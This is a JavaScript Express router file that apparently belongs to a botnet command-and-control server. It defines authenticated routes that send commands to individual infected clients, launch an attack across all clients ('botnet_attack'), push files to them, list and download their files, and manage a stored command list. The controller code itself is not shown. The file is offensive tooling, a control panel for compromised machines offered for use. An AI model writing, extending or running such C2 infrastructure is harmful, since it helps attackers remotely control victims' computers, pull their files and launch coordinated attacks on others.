
import { response, Router } from "express"; 
import  { send_cmd, upload_file, getFiles, downloadFiles, botnet_attack, getOperations, add_command, delete_command }  from "../controllers/c2c_controller.mjs";
import multer from "multer";
import { validate_jwt } from "../middlewares/validate_jwt.mjs";
import { checkAdmin } from "../middlewares/checkAdmin.mjs";
import sanitize from '../middlewares/sanitize.mjs'

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const middle=(req,res=response, next)=>{
    console.log("cmd");
    next()
}


const cmd_router = (clients, attacks_running) => {
    const router = Router();

    router.use(validate_jwt);
    
    router.post('/cmd/:id', (req,res) => send_cmd(clients,req,res));
    router.post('/cpanel/all',middle, (req,res) => botnet_attack(clients,attacks_running,req,res));
    router.post('/upload/:id', upload.single("file"), (req,res) => upload_file(clients,req,res));
    router.post('/get_files/', (req,res) => getFiles(clients,req,res));
    router.post('/download/', (req,res) => downloadFiles(clients,req,res));
    router.post('/operations/', (req,res) => getOperations(req,res));
    router.post('/add_command/', (req,res=response, next )=>{ checkAdmin(req,res, next)}, sanitize, (req,res) => add_command(req,res));
    router.delete('/delete_command/', (req,res=response, next)=>{ checkAdmin(req,res, next) },  (req,res) => delete_command(req,res));

    return router;
};

export default cmd_router

